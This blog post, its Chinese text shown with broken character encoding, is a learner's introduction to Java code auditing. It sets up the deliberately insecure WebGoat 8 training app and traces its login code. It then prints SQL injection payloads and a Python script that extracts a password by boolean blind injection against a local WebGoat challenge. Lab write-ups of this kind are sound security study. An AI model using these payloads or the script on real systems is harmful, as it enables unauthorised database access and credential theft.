<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="javaå®¡è®¡å…¥é—¨"/>




  <meta name="keywords" content="java," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/02/28/javaå®¡è®¡å…¥é—¨/"/>


<meta name="description" content="å¼€å§‹å­¦javağŸƒâ€â™€ï¸">
<meta property="og:type" content="article">
<meta property="og:title" content="javaå®¡è®¡å…¥é—¨">
<meta property="og:url" content="https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:description" content="å¼€å§‹å­¦javağŸƒâ€â™€ï¸">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png">
<meta property="og:image" content="https://i.loli.net/2020/02/28/G5I9b4twkRCfDlj.png">
<meta property="og:image" content="https://i.loli.net/2020/02/28/1dCqZYWozsciyAl.png">
<meta property="og:image" content="https://i.loli.net/2020/02/28/sUd7kCRpIQZTYGD.png">
<meta property="og:image" content="https://i.loli.net/2020/02/28/1LzqMlK3WkSNTBX.png">
<meta property="og:image" content="https://i.loli.net/2020/02/28/dhPNnAyO2Wqfziv.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/mfrict5lJKAGb3N.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/cNWOUaPJ24pvhin.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/qZbBMclXSHJvezE.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/vMBXitcdrzDuRGF.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/YnU29aHDcRCT6d7.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/OMTgHhaSyPi3BUx.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/8WOCRgpX9PQ6n3c.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/hxjp7vLbilQAruP.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/JQ9b4fXdFTcL3nK.jpg">
<meta property="og:image" content="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/GkPJds75AqZveWa.png">
<meta property="og:image" content="https://i.loli.net/2020/02/29/gwQ34koTXvfmiBW.png">
<meta property="article:published_time" content="2020-02-28T00:48:22.000Z">
<meta property="article:modified_time" content="2020-02-29T10:37:31.842Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> javaå®¡è®¡å…¥é—¨ - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          javaå®¡è®¡å…¥é—¨
        
      </h1>

      <time class="post-time">
          Feb 28 2020
      </time>
    </header>



    
            <div class="post-content">
            <p>å¼€å§‹å­¦javağŸƒâ€â™€ï¸</p>
<meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>ç®€é™‹çš„ç›®å½•</strong></p>
<!-- toc -->

<ul>
<li><a href="#å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</a></li>
<li><a href="#webgoat-8">WebGoat 8</a></li>
<li><a href="#å¼€å§‹å®¡è®¡">å¼€å§‹å®¡è®¡</a></li>
<li><a href="#sqlinjection">SqlInjection</a></li>
<li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>ä¸€èˆ¬é¢è¯•éƒ½ä¼šé—®åˆ°javaæ¼æ´äº†è§£å˜›ï¼Œä¼šåˆ†æğŸ´ï¼Œä½†æˆ‘ä¸€èˆ¬éƒ½æ˜¯åˆ©ç”¨ç°æˆå·¥å…·æˆ–è€…expã€‚è¶è¿˜æ²¡å¼€å­¦æ—¶é—´æ¯”è¾ƒå¤šï¼Œå­¦ä¹ ä¸€ä¸‹javaä»£ç å®¡è®¡ã€‚</p>
<h4><span id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</span></h4><p><strong>å®‰è£…</strong></p>
<p><strong>è¿è¡Œjavaç¨‹åº</strong>ï¼šå…ˆç¼–è¯‘<code>a.java</code>=&gt;<code>a.class</code>ï¼Œå› æ­¤<code>.class</code>ç»“å°¾çš„å­—èŠ‚ç æ–‡ä»¶éœ€è¦åç¼–è¯‘ï¼Œå·¥å…·æˆ‘ä¸€èˆ¬ç”¨jadx</p>
<p><strong>javaå¹³å°</strong>ï¼šjava seï¼Œjava eeï¼Œjava meï¼Œä¸»è¦å­¦ä¹ ç¬¬äºŒä¸ªwebæœåŠ¡</p>
<p><strong>å¸¸è§çš„javaæœåŠ¡å™¨</strong>ï¼š Tomcatã€Weblogicã€JBossã€GlassFish ï¼Œä¸»è¦å­¦ä¹ Tomcat</p>
<p><strong>Tomcatç›®å½•ç»“æ„</strong></p>
<p><img src="https://i.loli.net/2020/02/28/xtUypsE4VFJl1Me.png" alt="Snipaste_2020-02-28_09-16-33.png"></p>
<p><strong>Tomcatéƒ¨ç½²æºç </strong></p>
<p>javapmsä¸ºä¾‹</p>
<blockquote>
<p>ä»¥SpringMVC+Spring+Hibernate+Freemarker+Html5+jQueryä¸ºæŠ€æœ¯æ ¸å¿ƒæ¶æ„ </p>
</blockquote>
<p><img src="https://i.loli.net/2020/02/28/G5I9b4twkRCfDlj.png" alt="Snipaste_2020-02-28_09-47-08.png"></p>
<p><strong>IDEA</strong></p>
<p>å¯¼å…¥é¡¹ç›®å¹¶æ·»åŠ tomcaté…ç½®</p>
<p><img src="https://i.loli.net/2020/02/28/1dCqZYWozsciyAl.png" alt="Snipaste_2020-02-28_09-56-16.png"></p>
<p><strong>IDEAè°ƒè¯•åŠŸèƒ½</strong></p>
<p>å½“å‰é¡¹ç›®ç»“æ„ä¸å¤ªæ‡‚ï¼Œä¸çŸ¥é“å¦‚ä½•ä¸‹æ”¾æ–­ç‚¹ï¼Œè·³è¿‡</p>
<p><strong>Maven-é¡¹ç›®ç®¡ç†å’Œæ„å»ºå·¥å…·</strong></p>
<blockquote>
<p>Mavenæ˜¯ä¸€ç§è‡ªåŠ¨æ„å»ºé¡¹ç›®çš„æ–¹å¼ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨ä»æœ¬åœ°å’Œè¿œç¨‹ä»“åº“æ‹‰å–å…³è”jaråŒ…ã€‚ </p>
</blockquote>
<p>éƒ¨ç½²WebGoatä¸ºä¾‹ï¼Œå¯¼å…¥é¡¹ç›®</p>
<p><img src="https://i.loli.net/2020/02/28/sUd7kCRpIQZTYGD.png" alt="Snipaste_2020-02-28_10-13-36.png"></p>
<p>å®Œæˆä¹‹åbackgroundå°±å¼€å§‹ä¸‹è½½ï¼Œä½†æ˜¯é€Ÿåº¦</p>
<p><strong>Fortify ä»£ç å®¡è®¡å·¥å…·</strong></p>
<p>æš‚æ—¶å…ˆä¹Ÿä¸ç”¨</p>
<hr>
<h4><span id="webgoat-8">WebGoat 8</span></h4><blockquote>
<p>WebGoat8æ˜¯åŸºäºSpring bootæ¡†æ¶å¼€å‘,æ•…æ„ä¸å®‰å…¨çš„Webåº”ç”¨ç¨‹åºï¼Œæ—¨åœ¨æ•™æˆWebåº”ç”¨ç¨‹åºå®‰å…¨æ€§è¯¾ç¨‹ã€‚</p>
</blockquote>
<p>éœ€è¦çš„ç¯å¢ƒï¼šjava 11ã€Maven &gt; 3.2.1ã€IDEA</p>
<p>å®‰è£…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.git</span><br><span class="line">cd WebGoat</span><br><span class="line">mvn clean package -Dmaven.test.skip&#x3D;true</span><br><span class="line">mvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘æœ‰ä¸ªåŒ…ä¸‹è½½å¤±è´¥äº†å°±è·³è¿‡è¿™ä¸ªåŒ…</p>
<p>æœ€åæ˜¯å¦‚ä¸‹çš„ç•Œé¢</p>
<p><img src="https://i.loli.net/2020/02/28/1LzqMlK3WkSNTBX.png" alt="Snipaste_2020-02-28_22-05-31.png"></p>
<p> <strong>import WebGoatåˆ°IDEA è¿›è¡Œä»£ç æŸ¥çœ‹åŠè°ƒè¯•</strong> </p>
<p><img src="https://i.loli.net/2020/02/28/dhPNnAyO2Wqfziv.png" alt="Snipaste_2020-02-28_22-26-44.png"></p>
<p>å‘ç°å·²ç»é…ç½®å¥½äº†</p>
<p><strong>ç»„ä»¶å®‰å…¨</strong></p>
<p>ä¹Ÿæš‚æ—¶è·³è¿‡</p>
<blockquote>
<p>Dependency-Checkæ˜¯OWASPï¼ˆOpen Web Application Security Projectï¼‰çš„ä¸€ä¸ªå®ç”¨å¼€æºç¨‹åº ã€‚</p>
<p><a href="https://owasp.org/www-project-dependency-check/" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a>ä»¥åŠ<a href="https://yq.aliyun.com/articles/698621" target="_blank" rel="noopener">å‚è€ƒæ•™ç¨‹</a></p>
</blockquote>
<h4><span id="å¼€å§‹å®¡è®¡">å¼€å§‹å®¡è®¡</span></h4><p>ç¬¬ä¸€ä¸ªé¡µé¢æ˜¯ç™»å½•ï¼Œç™»å½•æ˜¯å¾ˆå®¹æ˜“å­˜åœ¨æ¼æ´çš„åŠŸèƒ½ç‚¹ä¹‹ä¸€ã€‚</p>
<p>æ²¡å­¦è¿‡Spring bootæ¡†æ¶ï¼Œæ—¢ç„¶è·¯ç”±æ˜¯<code>/login</code>ï¼Œå…¨å±€æœç´¢<code>login</code></p>
<p>æ‰¾åˆ°<code>org/owasp/webgoat/WebSecurityConfig.java</code></p>
<p>å¤§è‡´èƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯æ¼æ´çœ‹ä¸å‡ºæ¥==ï¼Œå…ˆçœ‹ä¸‹é¢è¿™ä¸ªç±»ä¼¼è®¤è¯çš„æ–¹æ³•</p>
<p><img src="https://i.loli.net/2020/02/29/mfrict5lJKAGb3N.png" alt="Snipaste_2020-02-28_23-04-27.png"></p>
<blockquote>
<p>æŸ¥é˜…<code>AuthenticationManagerBuilder auth</code> ï¼Œå…è®¸è½»æ¾æ„å»ºå†…å­˜èº«ä»½éªŒè¯ï¼ŒLDAPèº«ä»½éªŒè¯ï¼ŒåŸºäºJDBCçš„èº«ä»½éªŒè¯ï¼Œæ·»åŠ UserDetailsServiceä»¥åŠæ·»åŠ AuthenticationProviderã€‚ </p>
</blockquote>
<p>é‚£ä¹ˆè¿½è¸ª<code>userDetailsService</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final UserService userDetailsService;</span><br></pre></td></tr></table></figure>

<p>è¿½è¸ª<code>UserService</code></p>
<p><img src="https://i.loli.net/2020/02/29/cNWOUaPJ24pvhin.png" alt="Snipaste_2020-02-28_23-25-02.png"></p>
<p>å’Œæ–‡ç« ä¸€æ ·ï¼Œ<code>userRepository.findByUsername(username)</code>çŒœæµ‹æ˜¯æ•°æ®åº“æŸ¥è¯¢ï¼Œ</p>
<p>è¿½è¸ª</p>
<p><img src="https://i.loli.net/2020/02/29/qZbBMclXSHJvezE.png" alt="Snipaste_2020-02-28_23-32-03.png"></p>
<p>æ˜¯ä¸ªæ¥å£ï¼Œè¿½è¸ª</p>
<p><img src="https://i.loli.net/2020/02/29/vMBXitcdrzDuRGF.png" alt="Snipaste_2020-02-28_23-33-07.png"></p>
<p>è¿˜æ˜¯ä¸ªæ¥å£ï¼Œå®ç°äº†æ›´å¤šæ–¹æ³•ï¼Œç»§ç»­è¿½è¸ªï¼Œæœ€ååˆ°<code>Repository</code>æ¥å£æˆ‘ä¹Ÿæ²¡æ‰¾åˆ°å®ç°è¿™ä¸ªæ¥å£çš„ä»£ç </p>
<p><img src="https://i.loli.net/2020/02/29/YnU29aHDcRCT6d7.png" alt="Snipaste_2020-02-28_23-36-00.png"></p>
<p>è¿™æ˜¯ä¸ªå¯¼å…¥çš„åŒ…ï¼Œçœ‹æ¥å·²ç»é«˜åº¦é›†æˆï¼Œé‚£ä¹ˆåªéœ€è¦çŸ¥é“å…¶ç”¨æ³•å³å¯</p>
<blockquote>
<p>[<a href="http://blog.720ui.com/2017/springboot_02_data_jpa/" target="_blank" rel="noopener">Spring Boot æ­ç§˜ä¸å®æˆ˜ï¼ˆäºŒï¼‰</a>]</p>
</blockquote>
<p><strong>å®ä½“å¯¹è±¡</strong></p>
<p>åˆ›å»ºä¸€ä¸ª Author å®ä½“ï¼ŒçœŸå®çš„è¡¨åæ˜¯ t_authorï¼ŒåŒ…å« idï¼ˆè‡ªå¢ä¸»é”®ï¼‰ã€ realNameã€ nickname å­—æ®µã€‚ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Entity</span><br><span class="line">@Table(name &#x3D; &quot;t_author&quot;)</span><br><span class="line">public class Author&#123;</span><br><span class="line">    @Id</span><br><span class="line">    @GeneratedValue(strategy &#x3D; GenerationType.AUTO)</span><br><span class="line">    private Long id;</span><br><span class="line"> </span><br><span class="line">    @Column(name&#x3D;&quot;real_name&quot;)</span><br><span class="line">    private String realName;</span><br><span class="line"> </span><br><span class="line">    @Column(name&#x3D;&quot;nick_name&quot;)</span><br><span class="line">    private String nickName;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; SETå’ŒGETæ–¹æ³•</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>DAOç›¸å…³</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    List&lt;Author&gt; findAll();</span><br><span class="line"> </span><br><span class="line">    @Query(&quot;from Author where id &#x3D; :id&quot;)</span><br><span class="line">    Author findAuthor(@Param(&quot;id&quot;) Long id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªfromçš„æ˜¯å¯¹è±¡åï¼Œæ„Ÿè§‰ç±»ä¼¼äºé¢„ç¼–è¯‘ï¼Œèƒ½é˜²æ­¢sqlæ³¨å…¥</p>
<blockquote>
<p><a href="https://blog.csdn.net/China_hdy/article/details/101300380" target="_blank" rel="noopener">SpringBootæŸ¥è¯¢findByè§„åˆ™</a></p>
</blockquote>
<p>æ‰€ä»¥ä¸Šé¢çš„ç±»ä¼¼äº<code>fileByUsername()</code>ç±»ä¼¼äº</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... where username&#x3D;?1</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶ä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œç»§ç»­å›å»çœ‹</p>
<p><code>createUser()</code>åï¼Œåœ¨ä¹‹å‰<code>public WebGoatUser loadUserByUsername(String username)</code>çš„<code>return webGoatUser</code>åæ‰“ä¸Šæ–­ç‚¹ï¼Œå¹¶æ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œè·³è½¬å¦‚ä¸‹</p>
<p><img src="https://i.loli.net/2020/02/29/OMTgHhaSyPi3BUx.png" alt="Snipaste_2020-02-29_00-52-24.png"></p>
<p>åœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p><strong>æ³¨å†ŒåŠŸèƒ½</strong></p>
<p>å…¨å±€æœç´¢è·¯ç”±<code>/registration</code></p>
<p><img src="https://i.loli.net/2020/02/29/8WOCRgpX9PQ6n3c.png" alt="Snipaste_2020-02-29_00-56-47.png"></p>
<p>è¿½è¸ª<code>validate()</code></p>
<p><img src="https://i.loli.net/2020/02/29/hxjp7vLbilQAruP.png" alt="Snipaste_2020-02-29_01-03-36.png"></p>
<p>ä¹‹åå°±æ˜¯<code>addUser()</code>ï¼Œè·Ÿè¸ªä¸‹å‘ç°ä¹Ÿæ˜¯åˆ©ç”¨å°è£…å¥½çš„<code>save()</code>æ’å…¥æ•°æ®åº“</p>
<p>è¯´å¥½çš„ä¸å®‰å…¨å‘¢ï¼Ÿï¼ŸåŸæ¥æ˜¯è¦ç™»å½•è¿›å»æ‰å¼€å§‹å®éªŒ</p>
<img src="https://i.loli.net/2020/02/29/JQ9b4fXdFTcL3nK.jpg" alt="IMG_3502_20200229-011202_.PNG" style="zoom:37%;">

<h4><span id="sqlinjection">SqlInjection</span></h4><p>å…¨å±€æœç´¢sqlinjectionå°±èƒ½æ‰¾åˆ°æºç </p>
<p><img src="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png" alt="Snipaste_2020-02-29_01-37-25.png"></p>
<p>æŸ¥è¯¢çš„æ•°æ®ä¸­department=Marketingæ‰æœ‰å›æ˜¾</p>
<p><img src="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png" alt="Snipaste_2020-02-29_01-38-43.png"></p>
<p>å°è¯•è”åˆæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database()</span><br></pre></td></tr></table></figure>

<p><code>Something went wrong</code>ï¼Œåº”è¯¥æ˜¯ä¸æ”¯æŒè¿™ç§è¯­æ³•ï¼Œè¿½è¸ªä¸‹æ•°æ®åº“</p>
<p><img src="https://i.loli.net/2020/02/29/RmGWiNOAjwfKTgl.png" alt="Snipaste_2020-02-29_01-37-25.png"></p>
<p>ä¸çŸ¥é“æ˜¯å•¥ç±»å‹ï¼Œæµ‹è¯•å‘ç°ç›²æ³¨ä¹Ÿä¸è¡Œï¼Œå’Œmysqlä¸æ˜¯ä¸€ä¸ªè¯­æ³•çš„ã€‚ã€‚è¿™å…³ä¼¼ä¹åªæ˜¯ç†Ÿæ‚‰sqlè¯­æ³•</p>
<p><strong>challenge-9</strong></p>
<p><img src="https://i.loli.net/2020/02/29/hCyDa25FlPqUioG.png" alt="Snipaste_2020-02-29_01-38-43.png"></p>
<p>sqlè¯­å¥å·²ç»ç»™äº†ï¼Œç®€å•çš„æ‹¼æ¥ã€‚ã€‚</p>
<p><strong>æŸ¥çœ‹æŒ‘æˆ˜</strong><code>org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java</code></p>
<p><img src="https://i.loli.net/2020/02/29/GkPJds75AqZveWa.png" alt="Snipaste_2020-02-29_01-55-00.png"></p>
<p>æ˜æ˜¾é—®é¢˜å‡ºåœ¨checkUserQueryï¼Œæ˜¯ä¸ªå¸ƒå°”ç›²æ³¨ï¼Œå¦‚æœæ˜¯mysqlå°±ä¸å†™äº†ï¼Œè¿™é‡Œå†™ä¸ªè„šæœ¬è¯•è¯•</p>
<blockquote>
<p>è¿™é‡Œç”¨<code>--</code>å¯ä»¥æ³¨é‡Š</p>
<p><code>substr()</code>å¯ä»¥æˆªå–å­—ç¬¦ä¸²</p>
</blockquote>
<p>æ„é€ ä¸‹é¢çš„å‘ç°å›æ˜¾ä¸åŒ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- </span><br><span class="line">tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; --</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/29/gwQ34koTXvfmiBW.png" alt="Snipaste_2020-02-29_02-14-51.png"></p>
<p>æ˜¯putè¯·æ±‚ï¼Œjsonæ ¼å¼è¿”å›</p>
<blockquote>
<p><a href="https://blog.csdn.net/q649381130/article/details/77980304" target="_blank" rel="noopener">HTTPåè®®ä¸­PUTå’ŒPOSTä½¿ç”¨åŒºåˆ«</a></p>
</blockquote>
<p>å†™ä¸ªè„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">	&#39;JSESSIONID&#39; :&#39;XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw&#39;</span><br><span class="line">&#125;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;WebGoat&#x2F;SqlInjectionAdvanced&#x2F;challenge&quot;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko&#x2F;20100101 Firefox&#x2F;70.0&#39;</span><br><span class="line">&#125;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">tmp &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    if tmp &#x3D;&#x3D; 1:</span><br><span class="line">        break</span><br><span class="line">    tmp &#x3D; 1</span><br><span class="line">    for j in range(97, 127):</span><br><span class="line">        payload &#x3D; &quot;password&quot;</span><br><span class="line">        param &#x3D; &quot;tom&#39; and ascii(substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#123;&#125; and &#39;1&#39;&#x3D;&#39;1&quot;.format(payload, str(i), str(j))</span><br><span class="line">        print(param)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        	&#39;username_reg&#39;:param,</span><br><span class="line">        	&#39;email_reg&#39;:&#39;bb%40qq.com&#39;,</span><br><span class="line">        	&#39;password_reg&#39;:&#39;cc&#39;,</span><br><span class="line">        	&#39;confirm_password_reg&#39;:&#39;cc&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.put(url&#x3D;url, headers&#x3D;headers, data&#x3D;data, cookies&#x3D;cookies)</span><br><span class="line">        # r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, cookies&#x3D;cookies, data&#x3D;data)</span><br><span class="line">        c &#x3D; json.dumps(r.json())</span><br><span class="line">        # print(c)</span><br><span class="line">        if &quot;already&quot; in c:</span><br><span class="line">            tmp &#x3D; 0</span><br><span class="line">            flag &#x3D; flag + chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<hr>
<p>æœ€åï¼Œæœ‰ç©ºåˆ†æä¸€ä¸‹springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´ï¼Œçœ‹äº†åŸç†è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£çš„ã€‚</p>
<hr>
<h4><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</span></h4><p> <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932</a> </p>
<p> <a href="https://www.freebuf.com/vuls/214039.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/214039.html</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
              <a href="/" title="æ¬¢è¿è®¿é—® glotozz çš„ä¸ªäººåšå®¢">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
               æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">Javaååºåˆ—åŒ–æ¼æ´å­¦ä¹ </span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/02/27/XSS-bypass-CSP/">
        <span class="next-text nav-default">XSS&bypass CSP</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>
      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
